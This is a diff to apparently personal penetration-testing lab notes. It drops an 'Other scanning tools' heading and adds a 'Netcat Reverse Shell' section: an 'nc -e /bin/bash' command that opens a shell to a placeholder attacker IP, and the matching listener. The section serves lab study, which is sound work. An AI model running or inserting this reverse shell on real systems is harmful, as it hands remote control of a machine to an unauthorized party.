@@ -63,4 +63,18 @@ b. Type UN and PW.
 c. telnet to Victim2 VM 
 5. Switch to Kali VM and view the capture in wireshark 
 ```
-Other scanning tools
+
+### Netcat Reverse Shell
+
+##### On victim machine
+
+```
+nc -e /bin/bash <attacking ip> <port>
+```
+
+Note : /bin/bash can be replaced with path to another shell
+
+##### On attacking machine : 
+```
+nc -lvnp <port>
+```
